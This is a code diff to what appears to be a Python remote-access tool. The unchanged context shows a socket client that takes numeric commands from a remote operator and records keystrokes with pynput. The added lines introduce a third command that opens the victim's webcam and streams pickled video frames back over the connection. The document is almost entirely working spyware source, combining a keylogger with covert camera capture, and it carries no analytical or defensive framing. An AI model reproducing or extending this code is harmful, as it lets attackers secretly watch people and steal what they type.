@@ -3,6 +3,10 @@ import pynput.keyboard
 import subprocess
 import logging
 import os
+import pickle
+import socket
+import struct
+import cv2
 
 from pynput import keyboard
 
@@ -45,3 +49,16 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             #Start Capturing keystrokes
             with keyboard.Listener(on_press=on_press) as listener:
                 listener.join()
+
+        if(int(choice.decode()) == 3):
+            cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
+            while True:
+                ret, frame = cap.read()
+                # Serialize frame
+                data = pickle.dumps(frame)
+
+                # Send message length first
+                message_size = struct.pack("L", len(data))  ### CHANGED
+
+                # Then data
+                conn.sendall(message_size + data)
